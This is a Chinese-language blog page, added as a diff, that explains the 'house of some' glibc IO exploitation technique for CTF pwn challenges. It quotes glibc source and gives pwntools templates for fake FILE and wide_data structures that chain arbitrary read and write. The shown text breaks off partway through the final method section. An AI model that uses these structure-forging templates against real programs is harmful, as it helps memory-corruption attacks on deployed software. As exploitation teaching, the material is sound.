@@ -1,0 +1,759 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":100,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  
+  <title>
+    house of some |
+    
+    Hexo
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="House of some前言: 在22年,roderick01师傅发现了hosue of apple手法,宽字节跳表攻击几乎成为了每位pwn手的必备技能.house of apple2更是以简单的模板,极高的效率成为了传播范围,利用效率最高的IO攻击手法 之所以house of apple2有效是因为glibc没有对wide_data结构体中的跳表指针进行范围的检查,但是我们通过_IO_wfil">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house of some">
+<meta property="og:url" content="https://khighl.github.io.git/2025/05/15/house_of_some/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="House of some前言: 在22年,roderick01师傅发现了hosue of apple手法,宽字节跳表攻击几乎成为了每位pwn手的必备技能.house of apple2更是以简单的模板,极高的效率成为了传播范围,利用效率最高的IO攻击手法 之所以house of apple2有效是因为glibc没有对wide_data结构体中的跳表指针进行范围的检查,但是我们通过_IO_wfil">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-05-14T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-20T17:09:18.517Z">
+<meta property="article:author" content="zer00ne">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="house of some">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">house of some</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-of-some"><span class="toc-number">1.</span> <span class="toc-text">House of some</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.任意地址读</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO%E7%BB%93%E6%9E%84%E4%BD%93%E4%BC%AA%E9%80%A0"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">IO结构体伪造</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">1.2.2.</span> <span class="toc-text">任意地址写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">综合利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">1.2.4.</span> <span class="toc-text">最终利用手法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.3.</span> <span class="toc-text">例题</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-house_of_some" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-05-14T16:00:00.000Z" itemprop="datePublished">2025-05-15</time>
+    <time style="display: none;" id="post-update-time">2025-05-21</time>
+  </span>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="House-of-some"><a href="#House-of-some" class="headerlink" title="House of some"></a>House of some</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><ul>
+<li>在22年,<strong>roderick01</strong>师傅发现了<code>hosue of apple</code>手法,宽字节跳表攻击几乎成为了每位pwn手的必备技能.<code>house of apple2</code>更是以简单的模板,极高的效率成为了传播范围,利用效率最高的IO攻击手法</li>
+<li>之所以<code>house of apple2</code>有效是因为<code>glibc</code>没有对<code>wide_data</code>结构体中的跳表指针进行范围的检查,但是我们通过<code>_IO_wfile_overflow</code>调用位于<code>wide_data(0x68)</code>处的任意函数指针(<code>system,one_gadget,setcontext,swapcontext</code>)实现<code>getshell</code>或<code>orw</code></li>
+<li>总有一天,这个漏洞会被修复,好在在此前,Csome师傅发明了一种”新”的利用手法,避开了所有对跳表指针的合法检查</li>
+</ul>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="1-任意地址读"><a href="#1-任意地址读" class="headerlink" title="1.任意地址读"></a>1.任意地址读</h3><p>这几乎是每位师傅开始学习IO利用时学的第一个手法,而且在各种比赛中也被用于leak libc,我们回顾一下这个手法</p>
+<h4 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>
+
+<h4 id="IO结构体伪造"><a href="#IO结构体伪造" class="headerlink" title="IO结构体伪造"></a>IO结构体伪造</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_file_write = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x1800</span>, <span class="comment"># _flags</span></span><br><span class="line">    <span class="number">0x20</span>: ptr1,<span class="comment">#需要泄露的起始地址</span></span><br><span class="line">    <span class="number">0x28</span>: ptr2,<span class="comment">#需要泄露的终止地址</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno--&gt;stdout</span></span><br><span class="line">    <span class="number">0x68</span>: chain   <span class="comment"># _chain</span></span><br><span class="line">    <span class="number">0xd8</span>: _IO_file_jumps, <span class="comment"># vtable</span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>最经典的任意地址读</p>
+<h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>说实话我在学house of some前几乎没用过这个手法(</p>
+<p>相信各位师傅对这个手法也不是很熟悉吧(bushi)</p>
+<p>这里我们引入一个新的IO跳表指针:<em>IO_new_file</em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">	 required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">	 traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">	 not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">	 explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">	  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">	_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">	fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">	 handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">	 unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>观察这个跳表我们可以发现</p>
+<ul>
+<li><code>_flags</code>设置为<code>0</code>即可（与apple2相同）</li>
+<li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址，使得调用<code>_IO_wfile_overflow</code>即可</li>
+<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(_wide_data + 0x18) = 0</code>（与apple2相同）</li>
+<li><code>_wide_data-&gt;_IO_write_ptr</code>设置为大于<code>_wide_data-&gt;_IO_write_base</code>，即满足<code>*(_wide_data + 0x20) &gt; *(_wide_data + 0x18)</code></li>
+<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(_wide_data + 0x30) = 0</code>（与apple2相同）</li>
+<li><code>_wide_data-&gt;_wide_vtable</code>设置为任意一个包含<code>_IO_new_file_underflow</code>，其中原生的vtable就有，设置成<code>_IO_file_jumps-0x48</code>即可</li>
+<li><code>_vtable_offset</code>设置为<code>0</code></li>
+<li><code>_IO_buf_base</code>与<code>_IO_buf_end</code>设置为你需要写入的地址范围</li>
+<li><code>_chain</code>设置为你下一个触发的fake file地址</li>
+<li><code>_IO_write_ptr &lt;= _IO_write_base</code>即可</li>
+<li><code>_fileno</code>设置为<code>0</code>，表示<code>read(0, buf, size)</code></li>
+<li><code>_mode</code>设置为<code>2</code>，满足<code>fp-&gt;_mode &gt; 0</code>即可</li>
+</ul>
+<p>总的来说IO结构体伪造如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">fake_file_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0</span>, <span class="comment"># _flags</span></span><br><span class="line">    <span class="number">0x20</span>: <span class="number">0</span>, <span class="comment"># _IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: <span class="number">0</span>, <span class="comment"># _IO_write_ptr  </span></span><br><span class="line">    <span class="number">0x38</span>: 任意地址写的起始地址, <span class="comment"># _IO_buf_base</span></span><br><span class="line">    <span class="number">0x40</span>: 任意地址写的终止地址, <span class="comment"># _IO_buf_end</span></span><br><span class="line">    <span class="number">0x68</span>: 下一个调用的fake file地址, <span class="comment"># _chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0x82</span>: <span class="string">b&quot;\x00&quot;</span>, <span class="comment"># _vtable_offset</span></span><br><span class="line">    <span class="number">0xa0</span>: wide_data的地址, <span class="comment"># _wide_data</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">2</span>, <span class="comment"># _mode</span></span><br><span class="line">    <span class="number">0xd8</span>: _IO_wfile_jumps, <span class="comment"># vtable</span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">fake_wide_data = flat(&#123;</span><br><span class="line">    <span class="number">0xe0</span>: _IO_file_jumps - <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x18</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x20</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="number">0x30</span>: <span class="number">0</span>,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>最终会调用<code>read(fp-&gt;_fileno,fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</code></p>
+<p>这三个参数我们都可以控制</p>
+<h3 id="综合利用"><a href="#综合利用" class="headerlink" title="综合利用"></a>综合利用</h3><p>这两个功能单独拿出来确实不够看,但是放在一起就非常厉害了:任意地址读写!</p>
+<p>在很多师傅心中,IO利用似乎只有一次,经过一次IO流冲刷后进程就该exit_了,貌似我们只能在任意读,写中选一个利用</p>
+<p>但是别忘了<code>chain_</code>这个成员——angelboy提出的FSOP原来的样子,利用<code>chain_</code>把一个一个<code>fake file</code>串起来,通过多次的<code>fake file</code>调用<code>_IO_OVERFLOW</code>实现多个功能的调用</p>
+<p>现在我们来看<code>_IO_flush_all</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在for循环中,沿着链表<strong>对每个结构体进行检查,冲刷</strong></p>
+<h3 id="最终利用手法"><a href="#最终利用手法" class="headerlink" title="最终利用手法"></a>最终利用手法</h3><p>那么此时我们的思路就很明确了</p>
+<ul>
